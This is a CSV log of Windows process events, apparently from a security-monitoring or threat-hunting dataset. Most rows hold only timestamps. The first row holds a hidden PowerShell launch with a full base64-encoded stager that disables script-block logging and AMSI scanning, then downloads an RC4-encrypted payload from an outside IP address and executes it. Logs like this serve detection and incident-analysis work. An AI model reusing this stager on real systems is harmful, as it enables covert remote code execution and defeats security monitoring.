_time,user,Process_Name,Image,CommandLine
2018-08-20T10:11:00.019,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAG8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAHIAcwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAVABWAEEATAB1AEUAKAAkAE4AdQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAGUAQwBUAEkAbwBuAHMALgBHAGUAbgBFAHIAaQBjAC4ARABJAEMAVABpAG8ATgBhAFIAeQBbAHMAdAByAEkATgBHACwAUwB5AFMAdABlAG0ALgBPAEIASgBlAGMAVABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAVgBhAGwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAGUAewBbAFMAQwBSAEkAcABUAEIAbABvAGMAawBdAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAHUATABsACwAKABOAGUAdwAtAE8AQgBqAEUAYwBUACAAQwBvAGwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBJAG4AZwBdACkAKQB9ACQAUgBFAEYAPQBbAFIARQBmAF0ALgBBAFMAcwBFAG0AYgBsAHkALgBHAEUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQB0AEYAaQBFAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAVQBlACgAJABuAFUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAcwBUAGUATQAuAE4AZQB0AC4AUwBFAFIAdgBJAEMAZQBQAG8AaQBuAFQATQBhAG4AYQBHAGUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAE8AbgBUAGkATgB1AGUAPQAwADsAJAB3AGMAPQBOAEUAVwAtAE8AQgBKAEUAYwB0ACAAUwB5AFMAVABlAG0ALgBOAGUAdAAuAFcAZQBCAEMAbABpAGUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAYwAuAEgARQBBAGQAZQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAEgAZQBBAGQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBvAHgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcAZQBCAFIARQBRAFUARQBTAFQAXQA6ADoARABlAEYAQQBVAEwAVABXAGUAYgBQAHIAbwB4AFkAOwAkAHcAYwAuAFAAUgBPAFgAWQAuAEMAUgBlAGQAZQBOAFQASQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBEAEUAbgBUAEkAQQBsAEMAYQBDAGgARQBdADoAOgBEAGUAZgBBAFUATAB0AE4AZQB0AHcAbwByAEsAQwByAEUARABFAE4AVABJAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQBUAGUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBuAGMAbwBEAGkAbgBnAF0AOgA6AFUATgBpAGMAbwBkAEUALgBHAEUAdABTAHQAUgBpAE4ARwAoAFsAQwBPAE4AVgBFAFIAVABdADoAOgBGAFIATwBNAEIAYQBTAGUANgA0AFMAdABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAYwAuAEgAZQBBAGQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAUAB0AGgAQQBWAGcAcwA9AEcAMwBkAHEAbgBoAHIAOQBNAC8AdgBzAFIAWgBvAHMASwBRAFEASAAxAEgAcABEAHoARwBnAD0AIgApADsAJABEAEEAdABBAD0AJAB3AEMALgBEAG8AdwBuAGwATwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAFQAKQA7ACQAaQBWAD0AJABkAEEAVABBAFsAMAAuAC4AMwBdADsAJABEAGEAdABhAD0AJABkAEEAVABhAFsANAAuAC4AJABEAGEAdABBAC4AbABFAE4ARwBUAEgAXQA7AC0ASgBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
2018-08-20T10:11:00.019,,,,
2018-08-20T10:11:00.007,,,,
2018-08-20T10:07:06.630,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c
2018-08-20T10:07:06.630,,,,
2018-08-20T10:07:06.630,,,,
2018-08-20T10:07:06.130,,,,
2018-08-20T10:07:06.130,,,,
2018-08-20T10:07:06.112,,,,
2018-08-20T10:01:44.084,,,,
2018-08-20T10:01:44.084,,,,
2018-08-20T10:01:44.084,,,,
2018-08-20T10:01:41.262,,,,
2018-08-20T10:01:41.262,,,,
2018-08-20T10:01:41.243,,,,
2018-08-20T09:58:08.141,,,,
2018-08-20T09:58:08.141,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-07-25T19:16:54.000,,,,
2018-07-25T19:16:54.000,,,,
2018-07-25T19:16:54.000,,,,
2018-07-25T19:16:54.000,,,,
2018-07-25T19:16:54.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:42.000,,,,
2018-08-20T10:09:12.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-05-30T15:26:00.000,,,,
2018-05-30T15:26:00.000,,,,
2018-05-30T15:26:00.000,,,,
2018-05-30T15:26:00.000,,,,
2018-08-19T04:20:52.400,,,,
2018-08-19T04:20:52.400,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T08:39:54.478,,,,
2018-08-20T08:37:07.091,,,,
2018-08-20T08:37:07.091,,,,
2018-08-20T08:31:47.542,,,,
2018-08-20T08:29:30.937,,,,
2018-08-20T08:29:30.937,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T00:00:00.000,,,,
2018-08-20T10:04:40.000,,,,
2018-08-20T10:04:40.000,,,,
2018-08-20T10:04:40.000,,,,
2018-08-20T10:04:40.000,,,,
2018-08-20T10:13:02.000,,,,
2018-08-20T00:01:53.000,,,,
2018-08-20T00:01:53.000,,,,
2018-08-20T00:01:53.000,,,,
2018-08-20T00:01:53.000,,,,
2018-08-20T00:01:53.000,,,,
2018-08-20T10:26:27.000,,,,
2018-08-20T09:50:49.000,,,,
2018-08-20T09:50:49.000,,,,
2018-08-20T09:50:49.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T00:00:00.000,,,,
2018-02-23T02:10:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-08-20T10:35:12.000,,,,
2016-08-20T10:35:12.563,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-08-20T10:00:59.197,,,,
2018-08-20T10:00:54.184,,,,
2018-08-20T10:00:54.184,,,,
2018-08-20T10:00:54.113,,,,
2018-08-20T10:00:47.997,,,,
2018-08-20T10:00:47.997,,,,
2018-08-17T20:52:41.530,,,,
2018-08-18T15:20:52.400,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-06-19T15:26:00.000,,,,
2016-06-19T15:26:00.000,,,,
2018-08-18T05:20:52.400,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2016-04-28T20:52:41.530,,,,
2016-04-30T15:26:00.000,,,,
2016-06-19T15:26:00.000,,,,
2016-06-19T15:26:00.000,,,,
2016-06-19T15:26:00.000,,,,
2018-08-19T15:26:00.000,,,,
2018-02-22T20:52:41.530,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2016-04-30T15:26:00.000,,,,
2018-08-19T00:00:00.000,,,,
2018-08-19T00:00:00.000,,,,
2018-08-20T08:49:05.799,,,,
2018-08-20T08:25:47.959,,,,
2018-08-20T08:25:47.959,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2018-02-23T02:10:00.000,,,,
2016-06-19T15:26:00.000,,,,
2018-08-20T10:15:27.038,,,,
